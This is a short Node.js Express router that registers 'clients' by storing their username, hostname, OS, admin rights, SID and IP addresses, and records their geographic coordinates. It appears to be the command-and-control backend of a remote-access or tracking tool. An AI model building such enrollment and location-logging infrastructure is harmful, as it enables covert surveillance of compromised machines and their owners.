const router = require('express').Router();
const Client = require('../client.model');
const Utils = require('../../Utils/utilFunctions');
const ClientLocation = require("../../Location/clientLocation.model");
const toolCookieValidator = require('../../Utils/MiddleWears/toolCookieValidator');

//Add new client
router.route('/h1').post((req, res) => {
    const clientId = Utils.GenerateRandomId(8);
    const username = req.body.Username;
    const hostname = req.body.Hostname;
    const os = req.body.Os;
    const isAdmin = req.body.isAdmin !== "False";
    const status = true;
    const ipv4 = req.body.IPv4;
    const public_ip = req.body.PublicIP;
    const wifiEnabled = req.body.ifWifi;
    const sid = req.body.SID;
    const sessionKey = Utils.GenerateRandomSessionKey();
    const currentTimeDate = Utils.GetCurrentTimeDate();
    const newClient = new Client({
        client_id: clientId,
        username: username,
        hostname: hostname,
        session_key: sessionKey,
        os: os,
        isAdmin: isAdmin,
        status: status,
        ipv4: ipv4,
        public_ip: public_ip,
        wifiEnabled: wifiEnabled,
        sid: sid,
        lastActive: currentTimeDate
    });
    newClient.save()
        .then(() => {
            res.cookie('session_id', sessionKey);
            res.send(clientId);
        })
        .catch(err => {
            Utils.LogToFile(err)
            res.sendStatus(400)
        });
});


router.use(toolCookieValidator);
//Push a new location for client
router.route('/location').post((req, res) => {
        try {
            const clientId = req.headers.clientid;
            const location = req.body.location;
            const lat = location.lat;
            const lng = location.lng;
            const newLocation = new ClientLocation({client_id: clientId, lat: lat, lng: lng});
            newLocation.save()
                .then(() => res.send('Client location added successfully!'))
                .catch(err => res.status(401).send(`Error adding client location  ${err}`));
        } catch (err) {
            Utils.LogToFile(err)
            res.sendStatus(403);
        }
    }
)


module.exports = router;